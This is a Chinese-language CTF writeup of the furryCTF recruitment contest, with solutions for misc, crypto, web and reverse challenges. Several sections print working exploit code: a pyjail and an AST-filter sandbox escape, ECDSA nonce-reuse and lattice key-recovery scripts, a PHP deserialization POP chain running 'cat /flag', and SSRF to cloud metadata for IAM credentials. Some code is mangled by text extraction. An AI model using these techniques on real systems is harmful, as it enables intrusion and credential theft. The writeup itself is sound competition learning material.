---
title: "furryCTF暨pofp战队招新赛_writeup"
description: "队伍名：重生之幻想成为计算机添柴"
date: 2026-03-01
updated: 2026-03-01
draft: false
tags:
  - writeup
  - ctf
category: "writeup"
series: "writeup"
cover: "/images/banner-bg.jpg"
readingTime: 12
toc: true
---

## Misc
### 1. 签到题
打开环境查看答题结果
Ctrl+u 查看源码得到flag
题完

### 2. 学习资料
下载文件得到flag.zip；尝试弱密码爆破无
果。因为doc 文件头固定所以采用明文攻
击可以得到原始docx 文本
```text
话说，如果我用Word 文档存储我的学习资料，然后用压缩包加密起来，是
不是就没有人能偷走了owo。
至少我是这么认为的zwz，不信我在这里留下一个flag，谁拿到flag 就能反
驳我的观点zwz：
furryCTF{Ho0w_D1d_You_C0mE_H9re_xwx}
```

![Image 0](./2026-3-1-furryctf/page_1_img_0.png)

题目完
### 3. 困兽之斗
分析题目代码发现黑名单字符和功能限制
ascii_letters, digits（所有大小写字母和数字）
os, subprocess 被预先加载为字符串
Forbidden，阻止import 调用
getattr, help 被替换为pass
用户通过eval()执行
利用unicode 混淆和算术构造本题exp
因为题目禁用了”.”故不能用open('flag').read()
转用list(open('flag'))
得到payload 如下
```bash
𝘭𝘭𝘭𝘭𝘭𝘭𝘭𝘭(𝘰𝘰𝘰𝘰𝘰𝘰𝘰𝘰(𝘤𝘤𝘤𝘤𝘤𝘤(102)+𝘤𝘤𝘤𝘤𝘤𝘤(108)+𝘤𝘤𝘤𝘤𝘤𝘤(97)+𝘤𝘤𝘤𝘤𝘤𝘤(103)))
```
得到flag 本题完
### 4. 余音藏秘
打开wav 耳机党原地趋势
用mmsstv 配合虚拟声卡接收信号

得到
```text
U2FsdGVkX1/RxNkd2IGdQJ/tLDwU+2qkasEwA
ENOgBw=
```

![Image 0](./2026-3-1-furryctf/page_3_img_0.jpeg)

![Image 1](./2026-3-1-furryctf/page_3_img_1.png)

![Image 2](./2026-3-1-furryctf/page_3_img_2.png)

先base64 解码看看

发现salted_开头
配合”关键.txt”中的123456 分析为rc4 加密
解码便可得到flag

![Image 0](./2026-3-1-furryctf/page_4_img_0.png)

![Image 0](./2026-3-1-furryctf/page_5_img_0.jpeg)

题完

### 5. cyberchef
分析为chef 语言，找解码器（在线解码器问题需要先删除Liquify contents of the mixing bowl.行）

Output 区间值为32-122.且结尾为61 61 ==
故转换十进制按照ascii 转字符得base64 文本
```
ZnVycnlDV EZ7SV9Xb3UxZF9MMWtlX1Mw
bWVfVfQ29sb245bF9OdWdnZTddX09uX0NyYXd5X1RodXJzZGF5X1ZJVk9fNU9fQVdBfQ==
```
解码得flag，题完

![Image 0](./2026-3-1-furryctf/page_6_img_0.png)

### 6. AA 哥的JAVA

排序过于异常，故先分析空格是不是空白字
符隐写

有tab 和空格，找规律。发现空格+tab=8 长

![Image 0](./2026-3-1-furryctf/page_7_img_0.jpeg)

![Image 1](./2026-3-1-furryctf/page_7_img_1.jpeg)

故验证思路

Tab=1 空格=0 试一下

![Image 0](./2026-3-1-furryctf/page_8_img_0.jpeg)

![Image 1](./2026-3-1-furryctf/page_8_img_1.jpeg)

题完
## Crypto
### 1. hide
题目给了个hide.py
分析流程
Flag:m = bytes_to_long(pad(flag))。
Flag 长度 44 字节，填充 20 个 \x00，总计
64 字节（约 512 bits）。
同时生成了1024 bits 的大质数 x
A：6 个随机整数 ∈[1,x]。
B:Bi=(Ai⋅m)(modx)。
C:Ci=Bi(mod256)
x, A, C 已知
用c 还原m
Bi=Ai⋅m-qi⋅x
Qi 是商
Bi=ki⋅256+Ci
结合
Ai⋅m-ki⋅256-qi⋅x=Ci
M,ki.qi 未知

M 规模远远小于模数x，
用格基规约解决近似向量最短问题
利用LLL。构造L 使得包含m 的向量成为短
向量
```
x =
x =
11068359932740326085956687786279193520487260023947999337843615274
72232071906784740109313621867503217666545268634242468696763336973
21126678304486945686795080395648349877677057955164173793663863515
49985141303532792254784965942176145745430647194819674351739086253
4880779324672233898414340546225036981627425482221
A =
[7010037768323492814068058948174853511882398276332776121585079407
67833079309280003526952618195725539967265201111165474159960888709
81095803537658829691762888296987838096230461456681336360754325244
40915257579561871685314889370489860185806532259458628868370653070
766497850259451961004644017942384235055797395644,
74512008367681391576615422563769111304299667679061047768808113939
98248361954488700832886227215382856255233308849690658086126782968
15061630909264487030498515205945409196895262234718614260957254975
71027934265222847996257902446974751505984356357598199691411825903
191674839607030952271799209449395136250172915515,
25171034166045065048766468088478862083654896262788374008686766356
98349206482115325621615134375767149461931335832102858520112645160
34994008005908450232086945873912855905899987217187687050281895414
69405249485448442978139438800274489463915526151654081202939476333
828109332203871789408483221357748609311358075355,
52306344268758230793760445392598730662254324962115084956833680450
77622619192637121399608694076015195012166483876960669383408693653
36344194308906898015447677427094805657384732789682170816296976329
17059499356891370902154113670930248447468493869766005495777084987
102433647416014761261066086936748326218115032801,
26480507845716482175319392023541979383895128242501332399346563704
41229591673153566810342978780796842103474408026748569769289860666
76708433321267453046991068623163175979485270114239163488971221423
20396011372483252910580953147457869036315519463865086193851749795
29538717455213294397556550354362466891057541888,
41667663749770942643452778936946230305324831038664518499325648134
29296670145052328195058889292880408332777827251072855711166381389
29073720347581445855760235482780237034010688554625366515137615328
71797018476382472086470558462300605483408623566877387742581160750
51088973344675967295352247188827680132923498399]
C =
[9635421766411321871307976355025727510421535584581521253993268391
2934781564627,
30150406435560693444237221479565769322093520010137364328243360133
422483903497,
70602489044018616453691889149944654806634496215998208471923855476
473271019224,
48151736602211661743764030367795232850777940271462869965461685371
076203243825,
10391316704444709436921528048950152636022146767177440900417768947
9561470070160,
84110063463970478633592182419539430837714642240603879538426682668
855397515725]
n = 6
K = 2^256
M = Matrix(ZZ, n + 2, n + 2)
for i in range(n):
 M[i, i] = x
 inv_K = inverse_mod(K, x)
 M[n, i] = (A[i] * inv_K) % x
 M[n + 1, i] = (-C[i] * inv_K) % x
M[n, n] = 1
M[n + 1, n + 1] = x
L = M.LLL()
import binascii
for row in L:
 m_val = abs(row[n])
 if m_val > 0:
 h = hex(int(m_val))[2:]
 if len(h) % 2: h = '0' + h
 try:
 flag = binascii.unhexlify(h)
 if b'pofp{' in flag:
 print(flag.split(b'\x00')[0].decode())
 break
 except:
 continue
```

用sagemath 跑得flag，题完

### 2. lazy signer
分析脚本
```python
curve = SECP256k1
d = random.randint(1, n-1) # 私钥
pub_point = d * G # 公钥
aes_key = hashlib.sha256(str(d).encode()).digest() # AES 密钥由私钥
d 生成
def main():
 # 获取 flag 并加密
 cipher = AES.new(aes_key, AES.MODE_ECB)
 encrypted_flag = cipher.encrypt(pad(FLAG, 16))
 # 生成随机 nonce k (一次)
 k_nonce = random.randint(1, n-1)

 while True:
 # 签名服务
 if choice == '1':
 msg = input("Enter message to sign: ").strip()
 # 使用相同的 k_nonce 进行签名
 r, s = get_signature(msg.encode(), k_nonce)
```
ECDSA 签名的随机数k 在main 函数的循环外
部生成。意外这所有签名消息公用一个k 值
故随机数复用攻击
连接靶机可得加密的hex 格式flag
请求签名hello 得 $(r, s_1)$
请求签名world 得 $(r, s_2)$
验证$r$相通性
计算 $z_1 = \text{SHA256}("hello")$ 和 $z_2 =

\text{SHA256}("world")$
计算$k$
用$k, r, s_1, z_1$计算出私钥$d$
本题中AES 密钥由
hashlib.sha256(str(d).encode()).digest()
生成
利用计算出的私钥恢复aes 密钥解算flag
```python
import socket
import hashlib
import re
from Crypto.Cipher import AES
from ecdsa import SECP256k1
curve = SECP256k1
n = curve.order
G = curve.generator
host = "xx.xx.com"
port = xx
def receive_until(s, keyword):
 data = b""
 while keyword.encode() not in data:
 chunk = s.recv(1024)
 if not chunk:
 break
 data += chunk
 return data.decode()
def get_flag():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
 s.connect((host, port))

 print(f"连连连{host}:{port}")
 initial = receive_until(s, "Option: ")
 match = re.search(r"Encrypted Flag \(hex\): ([0-9a-f]+)",
initial)
 if not match:
 print("加密 flag 没拿到")
 return
 enc_flag_hex = match.group(1)
 encrypted_flag = bytes.fromhex(enc_flag_hex)
 print(f"[+] Encrypted Flag: {enc_flag_hex}")

 print("$(r, s_1)$-hello")
 s.sendall(b"1\n")
 receive_until(s, "Enter message to sign: ")
 msg1 = "hello"
 s.sendall(msg1.encode() + b"\n")
 resp1 = receive_until(s, "Option: ")

 match1 = re.search(r"Signature \(r, s\): \((\d+),
(\d+)\)", resp1)
 if not match1:
 print("签名失败")
 return
 r1 = int(match1.group(1))
 s1 = int(match1.group(2))

 print("$(r, s_2)$-world")
 s.sendall(b"1\n")
 receive_until(s, "Enter message to sign: ")
 msg2 = "world"
 s.sendall(msg2.encode() + b"\n")
 resp2 = receive_until(s, "Option: ")

 match2 = re.search(r"Signature \(r, s\): \((\d+),
(\d+)\)", resp2)
 if not match2:
 print("签名失败")
 return
 r2 = int(match2.group(1))
 s2 = int(match2.group(2))

 if r1 != r2:
 print("r 不是常数。随机数重用假设失败")
 print(f"r1: {r1}")
 print(f"r2: {r2}")
 return
 else:
 print(f"已确认替换后的相同随机数 (r={r1})")
 print(f" s1: {s1}")
 print(f" s2: {s2}")
 z1 =
int.from_bytes(hashlib.sha256(msg1.encode()).digest(), 'big')
 z2 =
int.from_bytes(hashlib.sha256(msg2.encode()).digest(), 'big')
 diff_z = (z1 - z2) % n
 diff_s = (s1 - s2) % n

 try:
 diff_s_inv = pow(diff_s, -1, n)
 except ValueError:
 print("计算模逆元出错")
 return

 k = (diff_z * diff_s_inv) % n
 print(f"k 值恢复 {k}")

 val = (s1 * k - z1) % n
 r_inv = pow(r1, -1, n)
 d = (val * r_inv) % n

 print(f"d: {d}")

 aes_key = hashlib.sha256(str(d).encode()).digest()
 cipher = AES.new(aes_key, AES.MODE_ECB)
 try:
 flag_padded = cipher.decrypt(encrypted_flag)
 print(f"{flag_padded}")
 print(f"解密后{flag_padded.decode(errors='ignore')}")
 except Exception as e:
 print(f"失败 {e}")
 except Exception as e:
 print(f"其他错误 {e}")
 finally:
 s.close()
if __name__ == "__main__":
 get_flag()
```
脚本跑一遍就行了，题目完
### 3. tiny random
也是签名
曲线参数SECP256k1
在生成签名所需的“k“时，使用了
random.getrandbits(128)
```python
  class RNG:
      def get_k(self):
           return random.getrandbits(128)

```
正常 ECDSA 的 “k“应该是 $[1, n-1]$ 范围内的
均匀随机数，对于 SECP256k1，$n \approx
2^{256}$。本题“k“为128 bit 高位128 位全为
0。每次连接会生成新的私钥”d“
利用签名预言机获取少量签名，恢复私钥，然
后签名为 "give_me_flag" 的消息获取 Flag
变差随机数问题
ECDSA 签名方程为：
$$ s \equiv k^{-1}(h + r \cdot d) \pmod n $$
变换得到：
$$ k \equiv s^{-1}(h + r \cdot d) \pmod n $$

```python
$$ k \equiv s^{-1}h + s^{-1}r \cdot d \pmod n $$
令 $t = s^{-1}r \pmod n$，$a = s^{-1}h \pmod n$。
```
则有：
$$ k - t \cdot d - a \equiv 0 \pmod n $$
已知 $0 < k < 2^{128}$。
构造格利用不等式约束求解$d$
完整exp
```python
import json
import hashlib
import sys
import os
import socket
import time
```

P =
0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2
f
N =
0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036414
1

def inverse(a, n):
    return pow(a, -1, n)

```python
import json
import hashlib
import sys
import os
import socket
import time
P =
0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2
f
N =
0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036414
1
def inverse(a, n):
 return pow(a, -1, n)
def create_matrix(rows, cols):
 mat = []
 for i in range(rows):
 mat.append([0] * cols)
 return mat
def dot_product(v1, v2):
 return sum(a * b for a, b in zip(v1, v2))
def deep_copy_matrix(mat):
 return [row[:] for row in mat]
def gram_schmidt(basis):
 n = len(basis)
 m = len(basis[0])
 mu = [[0.0] * n for _ in range(n)]
 b_star_sq = [0.0] * n
 b_star = [[0.0] * m for _ in range(n)]

 for i in range(n):
 b_star[i] = [float(x) for x in basis[i]]
 for j in range(i):
 mu[i][j] = dot_product(basis[i], b_star[j]) /
(b_star_sq[j] if b_star_sq[j] > 1e-9 else 1.0)
 for k in range(m):
 b_star[i][k] -= mu[i][j] * b_star[j][k]
 val = dot_product(b_star[i], b_star[i])
 b_star_sq[i] = val if val > 1e-9 else 1e-9

 return mu, b_star_sq
def lll_reduction(basis, delta=0.99):
 n = len(basis)
 m = len(basis[0])
 basis = deep_copy_matrix(basis)
 mu, b_star_sq = gram_schmidt(basis)

 k = 1
 while k < n:
 for j in range(k - 1, -1, -1):
 if abs(mu[k][j]) > 0.5:
 q = int(round(mu[k][j]))
 for x in range(m):
 basis[k][x] -= q * basis[j][x]
 mu, b_star_sq = gram_schmidt(basis)

 if b_star_sq[k] >= (delta - mu[k][k-1]**2) * b_star_sq[k1]:
 k += 1
 else:
 basis[k], basis[k-1] = basis[k-1], basis[k]
 mu, b_star_sq = gram_schmidt(basis)
 k = max(k - 1, 1)
 return basis
host = "ctxxcom"
port = 3xx
def solve_live():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, port))

 from ecdsa import SECP256k1
 from ecdsa.util import sigencode_string
 import random

 buffer = b""
 while b'\n' not in buffer:
 chunk = s.recv(1024)
 if not chunk: break
 buffer += chunk

 line, buffer = buffer.split(b'\n', 1)
 pk_data = json.loads(line.decode())
 print("公钥", pk_data)

 num_sigs = 5
 sigs = []

 print(f"采集 {num_sigs} ")
 for i in range(num_sigs):
 msg = f"test{i}"
 req = json.dumps({"op": "sign", "msg": msg})
 s.sendall(req.encode() + b"\n")

 while b'\n' not in buffer:
 chunk = s.recv(1024)
 if not chunk: break
 buffer += chunk

 if b'\n' in buffer:
 line, buffer = buffer.split(b'\n', 1)
 sig_data = json.loads(line.decode())
 sigs.append(sig_data)
 else:
 print("返回包 bcz")
 return
 t = []
 a = []

 for i in range(num_sigs):
 r = int(sigs[i]['r'], 16)
 s_val = int(sigs[i]['s'], 16)
 h = int(sigs[i]['h'], 16)

 s_inv = inverse(s_val, N)
 t_val = (s_inv * r) % N
 a_val = (s_inv * h) % N
 t.append(t_val)
 a.append(a_val)

 t0_inv = inverse(t[0], N)
 r_coeffs = []
 s_vals = []

 for i in range(1, num_sigs):
 ri = (t[i] * t0_inv) % N
 si = (a[i] - ri * a[0]) % N
 r_coeffs.append(ri)
 s_vals.append(si)

 Bound = 2**128
 m_eq = num_sigs - 1
 dim = m_eq + 2

 matrix = []
 row0 = [1] + r_coeffs + [0]
 matrix.append(row0)

 for i in range(m_eq):
 row = [0] * dim
 row[i+1] = N
 matrix.append(row)

 row_last = [0] + s_vals + [Bound]
 matrix.append(row_last)

 print("LLL")
 reduced = lll_reduction(matrix)
 print("ok")

 k0_candidates = []
 for row in reduced:
 if abs(row[-1]) == Bound:
 if row[-1] == Bound:
 k0_candidates.append(row[0])
 else:
 k0_candidates.append(-row[0])

 found_key = None

 for k0_guess in k0_candidates:
 if k0_guess < 0: k0_guess += N
 d_guess = ((k0_guess - a[0]) * t0_inv) % N

 k1_derived = (t[1] * d_guess + a[1]) % N
 if k1_derived < 2**129:
 print(f"d:{d_guess}")
 found_key = d_guess
 break

 if not found_key:
 print("fall")
 s.close()
 return
 msg = b"give_me_flag"
 h_bytes = hashlib.sha256(msg).digest()
 h_int = int.from_bytes(h_bytes, 'big')

 k = random.getrandbits(256) % N

 curve = SECP256k1
 G = curve.generator
 P_point = k * G
 r = P_point.x() % N
 s_sig = (inverse(k, N) * (h_int + r * found_key)) % N

 req = json.dumps({
 "op": "flag",
 "r": hex(r),
 "s": hex(s_sig)
 })

 s.sendall(req.encode() + b"\n")

 while True:
 try:
 if b'\n' in buffer:
 line, buffer = buffer.split(b'\n', 1)
 print("靶机返回", line.decode())
 if "flag" in line.decode():
 break
 else:
 chunk = s.recv(1024)
 if not chunk: break
 buffer += chunk
 except Exception as e:
 print("fyq", e)
 break

 s.close()

if __name__ == "__main__":
 solve_live()
```
题完
### 4. 迷失
1.PRF（伪随机函数）：使用 AES-ECB 生成伪随机比特
2.编码方式：基于二分查找的区间编码，类似算术编码或范
围编码
关键点是_encode 使用递归二分区间进行编码，但信息泄露
random_bit 只有 0 或 1 两种可能，等于每个区间划分，
只有两种路径偏移。
直接脚本走一下
``` python
HEX_STREAM = (
    "4ee06f407770280066806d00609167402800689173402800668074f17200
72007900"
    "4271550046e07b0050006d0065c06091734074f1720065c05f4050f174f1
65c07200"
    "79005f404f7072003a6065c072005f405000720065c0734065c03af07680
68916e80"
    "67405f406295720079007000740068916f406e805f406f4077706f407cf1
28002f49"
    "28006df06091650065c0280061e17900280050f150f13c5938d438203940
39403790"
    "37903b8039d038203b802800714077707140"
)

PLAINTEXT_MASK = (
    "Now flag is
furryCTF{????????_?????_?????_??????????_????????_???} - "
    "made by QQ:3244118528 qwq"
)

VISIBLE_ASCII = set(range(32, 127))

def run():
 cipher_words = split_words(HEX_STREAM)
 assert len(cipher_words) == len(PLAINTEXT_MASK)
 forward_map = {} # cipher -> plain(byte)
 for w, ch in zip(cipher_words, PLAINTEXT_MASK):
 if ch != '?':
 forward_map[w] = ord(ch)
 anchors = sorted(forward_map.items()) # (cipher, plain)
 def plain_range(target):
 lower = upper = None
 for cw, pw in anchors:
 if cw < target:
 lower = pw
 elif cw > target:
 upper = pw
 break
 return lower, upper
 result = []
 domains = {} # pos -> (cipher, candidates)
 for pos, cw in enumerate(cipher_words):
 if cw in forward_map:
 result.append(chr(forward_map[cw]))
 continue
 lo, hi = plain_range(cw)
 lo = 0 if lo is None else lo + 1
 hi = 255 if hi is None else hi - 1
 pool = [x for x in range(lo, hi + 1) if x in
VISIBLE_ASCII]
 domains[pos] = (cw, pool)
 result.append('?')
 updated = True
 while updated:
 updated = False
 for i, (ci, di) in domains.items():
 for j, (cj, dj) in domains.items():
 if i == j:
 continue
 if ci < cj:
 filtered = [x for x in di if any(x < y for y
in dj)]
 elif ci > cj:
 filtered = [x for x in di if any(x > y for y
in dj)]
 else:
 filtered = [x for x in di if x in dj]
 if len(filtered) != len(di):
 domains[i] = (ci, filtered)
 updated = True
 for idx, (_, opts) in domains.items():
 if len(opts) == 1:
 result[idx] = chr(opts[0])
 final_line = ''.join(result)
 print(final_line)
 if "furryCTF{" in final_line:
 core = final_line.split("furryCTF{", 1)[1].split("}",
1)[0]
 print("\nflag:", core)
if __name__ == "__main__":
 run()
``` 
题完

## Web
### 1. 下一代有下一代的问题
已知cve 利用，找工具一把梭
![image](./2026-3-1-furryctf/page_26_img_0.jpeg)
题完
### 2. pyeditor
审计一下
```python
 def validate_code(self):
 tree = ast.parse(self.code)

 # 黑名单
 banned_modules = ['os', 'sys', 'subprocess', 'shlex',
'pty', ...]
 banned_functions = ['eval', 'exec', 'compile', 'input',
'__import__', 'open', ...]
 banned_methods = ['system', 'popen', 'spawn', 'execv', ...]
 dangerous_attributes = ['__class__', '__base__', '__bases__',
'__mro__',
 '__subclasses__', '__globals__',
'__builtins__', ...]

 for node in ast.walk(tree):
 # 检查 import 语句
 if isinstance(node, ast.Import):
 for name in node.names:
 if name.name in banned_modules:
 return False, f"禁止导入模块: {name.name}"

 # 检查危险属性 - 漏洞点！
 elif isinstance(node, ast.Attribute):
 if node.attr in dangerous_attributes:
 if isinstance(node.value, ast.Call) or
isinstance(node.value, ast.Name):
 return False, f"禁止访问危险属性: {node.attr}"
```
只拦截了变量名和函数调用，忽略了其他 ast
节点了类型
直接 payload
```python
def get_flag():
 c = ().__class__.__bases__[0].__subclasses__()
 for cls in c:
 try:
 g = cls.__init__.__globals__
 if '__builtins__' in g:
 b = g['__builtins__']
 if isinstance(b, dict) and '__import__' in b:
 o = b['__import__']('os')
 return o.environ.get('GZCTF_FLAG', 'No flag')
 elif hasattr(b, '__import__'):
 o = getattr(b, '__import__')('os')
 return o.environ.get('GZCTF_FLAG', 'No flag')
 except:
 pass
 return "Not found"
def main():
 print("抓 flag")
 result = get_flag()
 print(f"Flag: {result}")
 return 0
if __name__ == "__main__":
 main()
```
题完 了吗？
### 3. 猫猫最后的复仇
Python 3.7+ 引入了内置函数 breakpoint()，
默认会调用 pdb.set_trace()当程序运行到这一
行时，会进入一个交互式的调试环境。在调
试模式下，可以输入任意 Python 代码并立
即执行。
敲breakpoint() 触发调试
F12 看下接口是/api/send_input
需要提供pid 和input
利用控制台发送post 请求得到flag
``` json
fetch("/api/send_input", {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({
 "pid": "当前页面的实际 PID",
 "input": "print(open('/flag.txt').read())" /
 })
});
```
得flag

题完
### 4. ezmd5
简单md5 碰撞注意下题目要求格式就行
![Image 0](./2026-3-1-furryctf/page_29_img_0.png)

题目完
### 5. CCPreview
 系统过滤只允许http(s)试了下|管道不行，题
目提示云端了那就访问ec2 元数据
看下iam 路径
高歌猛进就行了

![Image 1](./2026-3-1-furryctf/page_29_img_1.png)

### 6. babypop
反序列化+pop 链，反序列化还套了个字符筛
选
构造一个logservice 对象使#handler 设置为
filestream，调用其close()方法LogService 的
__destruct()会调用$this-handler-close()
Filestream 属性mode=debug，
content=”system(‘’cat /flag);”
```python
LogService {
    handler = FileStream {
        mode = 'debug'
        content = "system('cat /flag');"
        path = 'anything'
    }
    formatter = DateFormatter {}
}
```
反序列化
```python
O:11:"UserProfile":3:{s:8:"username";s:LEN:"USER_PAYLOAD";s:3:"bi
o";s:LEN:"BIO_PAYLOAD";...}
```
Exp
``` python
import urllib.parse
def serialize_string(s):
 return f's:{len(s)}:"{s}";'
cmd = "system('cat /flag');"
fs_content =
f'O:10:"FileStream":3:{{s:16:"\0FileStream\0path";s:8:"anything";
s:16:"\0FileStream\0mode";s:5:"debug";s:7:"content";{serialize_st
ring(cmd)}}}'
df_content = 'O:13:"DateFormatter":0:{}'
ls_content =
f'O:10:"LogService":2:{{s:10:"\0*\0handler";{fs_content}s:12:"\0*
\0formatter";{df_content}}}'
suffix = '";s:3:"bio";s:3:"xxx";s:10:"preference";' + ls_content
+ '}'
len_suffix = len(suffix)
print("我算算算")
found = False
for n in range(1, 1000):
 consumed_capacity = 6 * n

 for digits in range(1, 6):
 len_intermediate = 16 + digits

 if consumed_capacity > len_intermediate:
 padding_len = consumed_capacity - len_intermediate
 total_bio_len = padding_len + len_suffix

 if len(str(total_bio_len)) == digits:
 found = True
 print(f"N {n}")
 print(f"Padding{padding_len}")
 print(f"Payload Length: {total_bio_len}")

 user_payload = "hacker" * n
 bio_payload = ("A" * padding_len) + suffix

 data = {
 'user': user_payload,
 'bio': bio_payload
 }

 print(f"p1 {user_payload}")
 print(f"p2{bio_payload}")

 try:
 import requests
 url = "htxxxxx:xx"
 r = requests.post(url, data=data)
 print(f"\n rep:\n{r.text}")
 except Exception as e:
 print(f"req fail {e}")
 encoded_data = urllib.parse.urlencode(data)
 with open("payload.txt", "w") as f:
 f.write(encoded_data)
 print("保存 payload")

 break
 if found:
 break
if not found:
 print("fall")
 ```

## Reverse
### 1. 未来程序
一个cpp 解释器
一个编码规则和输出

| 规则 | 说明 | 示例 |
|------|------|------|
| `A=B` | 将字符串中的 A 替换为 B | `ab=cd` |
| `(start)A=B` | 只匹配开头的 A | `(start)0=` 删除开头的 0 |
| `(end)A=B` | 只匹配末尾的 A | `x1=(end)211*` |
| `A=(start)B` | 将 B 插入到开头 | `1*y=(start)1` |
| `A=(end)B` | 将 B 插入到末尾 | `x1=(end)211*` |
| `(once)A=B` | 执行一次的替换 | `(once)+=−` |
| `(return)` | 匹配成功则输出并退出 | - |

```python
while (true) {
    for (每条规则) {
        if (匹配成功) {
            执行替换;
            break;  // 从头开始匹配
        }
    }
    if (没有规则匹配) break;
}
```
分析txt
``` 
(once)=(start)xxx...xxx # 1. 在开头添加大量 x
(once)=(start)| # 2. 添加分隔符 |
x1=(end)211* # 3. 处理二进制 1
x0=(end)200* # 4. 处理二进制 0
x+=(end)2++* # 5. 处理加号 +
(once)=(end)yyy...yyy # 6. 在末尾添加大量 y
1*y=(start)1 # 7. 将数字移到开头
0*y=(start)0
+*y=(start)+
0y=y0 # 8. y 向左冒泡
1y=y1
+y=y+
x= # 9. 清理 x
2= # 10. 清理 2
y= # 11. 清理 y
(once)+=- # 12. 关键！将 + 替换为 -
+1=ta+ # 13. 二进制加法规则
+0=t+
+=
at=taa
t=
1a=a0
0a=1
a=1
-1=qb- # 14. 二进制减法规则
-0=q-
-=
bq=qbb
q=
0b=b1
1b=0
(start)0= # 15. 删除开头的 0
Output=110011001110101...|0110011001110101...
```
输入格式：二进制A+二进制B
执行如下操作
1. 复制操作数 B 到 `|` 后面
2. 将 `+` 替换为 `-`
3. 执行二进制减法 `A - B`
4. 输出格式: `(A-B)|B 编码值`
输出中的 B 部分不是原始的 B，经过特殊
编码
通过对比分析 A 和 B 的每个字节，发现了
编码规律：
A[i] = 2 × flag1[i]     (每个字节是 flag 字符
的 2 倍)
B[i] = flag1[i] + flag2[i]  (两部分 flag 字符相
加)
逆向公式
```python
完整flag = flag1 + flag2
flag1[i] = A[i] / 2
flag2[i] = B[i] - flag1[i] = B[i] - A[i]/2
```
``` python
def decode_furryCTF():
 result =
"1100110011101010001001100101111010010001101010111100011110110100
00101100001110100000010111101100001010000011011111000010001000111
101100111001110001010111001000111100011111111111101010"
 b_part =
"0110011001110101110100011011010110101001101100001100010010110010
11100000100010111100110111011100110100101010001010110001110101001
1010001110000011101010010100101111000001101110011100100"

 a_val = int(result, 2) + int(b_part, 2)
 a_bin = bin(a_val)[2:]

 a_bytes = []
 b_bytes = []
 for i in range(0, 184, 8):
 a_bytes.append(int(a_bin[i:i+8], 2))
 b_bytes.append(int(b_part[i:i+8], 2))

 flag1 = ""
 for a in a_bytes:
 flag1 += chr(a // 2)

 flag2 = ""
 for i in range(len(a_bytes)):
 diff = b_bytes[i] - a_bytes[i] // 2
 if diff > 0:
 flag2 += chr(diff)

 full_flag = flag1 + flag2

 print(f"部分 1 (A/2): {flag1}")
 print(f"部分 2 (B-A/2): {flag2}")
 print(f"\n 完整 Flag: {full_flag}")

 return full_flag
if __name__ == "__main__":
 decode_furryCTF()
```
题完
### 2. lua
分析文件
```
local b =
'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
```
base64 字符表
逆向思路
```python
check[i] = f(flag[i])
flag[i] = f⁻¹(check[i])
```
枚举一下找标准flag 头
``` python
import string
target = [
20,30,19,21,9,39,45,0,45,62,7,70,
38,45,63,70,1,6,65,32,83,15
]
printable = [ord(c) for c in string.printable]
def try_solve():
 results = []
 for mode in ["add", "sub", "xor"]:
 for k in range(0, 128):
 flag = []
 ok = True
 for i, t in enumerate(target):
 if mode == "add":
 c = t - k
 elif mode == "sub":
 c = t + k
 else: # xor
 c = t ^ k
 if c not in printable:
 ok = False
 break
 flag.append(chr(c))
 if ok:
 results.append((mode, k, "".join(flag)))
 return results
res = try_solve()
for r in res:
 print(r)
```
![Image 0](./2026-3-1-furryctf/page_37_img_0.jpeg)

题目完


### 3. ezvm
- 存在 **假 flag**
- 程序包含字符串：
  - `input`
  - `right`
  - `wrong`

反汇编一下存在简单虚拟机vm

| adr | 作用 |
|--------|------|
| `r8d`  | 字符串指针 |
| `edx`  | 字节码指针 |
| `r9d`  | 当前读取的字符 |
| `r10b` | 比较结果标志 |
| `rbx`  | 字符串缓冲区基址 |
| `rbp-0x40` | 字节码缓冲区基址 |

从**0x1400011cb**
开始程序初始化字节码
``` hex
movl $0x3a322510,-0x40(%rbp)  ; 字节: 10 25 32 3a
movl $0x3a63250b,-0x3c(%rbp)  ; 字节: 0b 25 63 3a
movl $0x410d660b,-0x38(%rbp)  ; 字节: 0b 66 0d 41
movl $0x00665531,-0x34(%rbp)  ; 字节: 31 55 66 00
movb $0xff,-0x30(%rbp)        ; 字节: ff
```
完整字节码是
```
10 25 32 3a 0b 25 63 3a 0b 66 0d 41 31 55 66 00 ff
```
文件偏移0x770

RVA 0x1370

提取操作码映射表
虚拟机在执行前会对字节码进行偏移调整
```
movzbl -0x40(%rbp,%rax,1),%eax  ; 读取字节码
sub    $0x10,%eax                ; 减去 0x10
cmp    $0x56,%eax                ; 检查范围
```
因此，实际操作码=字节码-10
```
Case 0 (READ)：读取字符串[IP] 到 r9
Case 1 (CMP)：比较 r9 与下一个字节码字节
Case 2 (JZ)：如果比较结果为真则跳转
Case 3 (WRITE)：将下一个字节码字节写入字符串[IP]
Case 4 (INC)：字符串指针 IP++
Case 5 (JMP)：无条件跳转
Case 6 (EXIT)：退出虚拟机
```
字节反汇编
```python
[00] 0x10 - 0x10 = 0x00 -> Case 0 (READ)
[01] 0x25 - 0x10 = 0x15 -> Case 1 (CMP)
[02] 0x32 - 0x10 = 0x22 -> 参数：比较值 0x32 ('2')
[03] 0x3a - 0x10 = 0x2a -> Case 2 (JZ)
[04] 0x0b - 0x10 = 0xfb -> 参数：跳转地址 0x0b (11)
[05] 0x25 - 0x10 = 0x15 -> Case 1 (CMP)
[06] 0x63 - 0x10 = 0x53 -> 参数：比较值 0x63 ('c')
[07] 0x3a - 0x10 = 0x2a -> Case 2 (JZ)
[08] 0x0b - 0x10 = 0xfb -> 参数：跳转地址 0x0b (11)
[09] 0x66 - 0x10 = 0x56 -> Case 5 (JMP)
[10] 0x0d - 0x10 = 0xfd -> 参数：跳转地址 0x0d (13)
[11] 0x41 - 0x10 = 0x31 -> Case 3 (WRITE)
[12] 0x31 - 0x10 = 0x21 -> 参数：写入值 0x31 ('1')
[13] 0x55 - 0x10 = 0x45 -> Case 4 (INC)
[14] 0x66 - 0x10 = 0x56 -> Case 5 (JMP)
[15] 0x00 - 0x10 = 0xf0 -> 参数：跳转地址 0x00 (0)
